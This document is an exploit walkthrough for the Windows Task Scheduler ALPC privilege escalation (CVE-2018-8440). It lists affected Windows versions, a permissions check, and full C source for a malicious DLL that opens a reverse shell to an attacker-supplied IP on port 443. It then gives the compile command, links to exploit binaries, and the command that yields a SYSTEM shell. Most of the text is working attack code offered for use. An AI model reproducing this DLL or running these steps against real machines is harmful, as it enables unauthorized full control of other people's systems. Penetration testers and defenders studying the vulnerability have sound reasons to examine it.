| CVE / MS  | Title | Vulns |
| --------- | ----- | ----- |
| CVE-2018-8440 | Microsoft Windows Task Scheduler ALPC Interface Local Privilege Escalation Vulnerability | win_10 version_1607 arc_x64,win_10 version_1607 arc_x86,win_server_2008 sp_2 arc_x64,win_rt arc_x86,win_10 version_1803 arc_x86,win_10 arc_x64,win_server_2012 arc_x86,win_7 sp_1 arc_x64,win_server_2016 arc_x86,win_server_2008 sp_2 arc_x86,win_server_1709 arc_x86,win_8.1 arc_x86,win_server_1803 arc_x86,win_server_2008 sp_1 arc_x64,win_10 version_1803 arc_x64,win_7 sp_1 arc_x86,win_10 arc_x86,win_server_2008 sp_1 arc_x86 |

<br><br>

First to verify if this exploit will work to see if we have Read+Execute access for Authenticated Users group on the `C:\Windows\Tasks` folder. We can check those permisions using `icacls` :

```sh
PS C:\> icacls C:\Windows\Tasks
C:\Windows\Tasks NT AUTHORITY\Authenticated Users:(RX,WD)
                 BUILTIN\Administrators:(F)
                 BUILTIN\Administrators:(OI)(CI)(IO)(F)
                 NT AUTHORITY\SYSTEM:(F)
                 NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
                 NT AUTHORITY\SYSTEM:(F)
                 CREATOR OWNER:(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
```

If we have RX for Authenticated Users we can proceed with the exploit.<br><br>
Next we need a malicious DLL for the exploit to execute and give us what we want, a reverse shell. To generate the DLL copy the below source code and change &lt;Your-Machine-IP&gt; and save it as rs.cpp:

```c
#include <stdio.h>
#include <string.h>
#include <process.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#pragma comment(lib, "Ws2_32.lib")

#define REMOTE_ADDR "<Your-Machine-IP>"
#define REMOTE_PORT "443"

void revShell();

BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD dwReason, LPVOID lpReserved)
{
        switch(dwReason)
        {
                case DLL_PROCESS_ATTACH:
                        revShell();
                        break;
                case DLL_PROCESS_DETACH:
                        break;
                case DLL_THREAD_ATTACH:
                        break;
                case DLL_THREAD_DETACH:
                        break;
        }

        return 0;
}
void revShell()
{
	FreeConsole();
	WSADATA wsaData;
	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	struct addrinfo *result = NULL,	*ptr = NULL, hints;
	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	getaddrinfo(REMOTE_ADDR, REMOTE_PORT, &hints, &result);
	ptr = result;
	SOCKET ConnectSocket = WSASocket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol, NULL, NULL, NULL);	
	connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.hStdInput = (HANDLE)ConnectSocket;
	si.hStdOutput = (HANDLE)ConnectSocket;
	si.hStdError = (HANDLE)ConnectSocket;
	TCHAR cmd[] = TEXT("C:\\WINDOWS\\SYSTEM32\\CMD.EXE");
	CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL,	NULL, &si, &pi);
	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	WSACleanup();
}
```

Next to compile this you need to have `mingw-w64` installed.(`apt install mingw-w64`)<br><br>
Execute below command to compile it as DLL :

```sh
x86_64-w64-mingw32-g++ rs.cpp -o rs.dll -lws2_32 -shared
```

Depending on your target box, download one of the exploit binaries:

* [ALPC_DiagHub.x64.exe](https://github.com/realoriginal/alpc-diaghub/raw/master/ALPC_DiagHub.x64.exe)
* [ALPC_DiagHub.x86.exe](https://github.com/realoriginal/alpc-diaghub/raw/master/ALPC_DiagHub.x86.exe)

<br>

Upload the exploit file and the rs.dll on your target box in a same directory, start netcat listener on the port mentioned in the DLL source and execute:

```sh
cmd /c ALPC_DiagHub.x64.exe rs.dll .\lol.rtf
```

You should receive reverse shell as SYSTEM instantly on your netcat listener.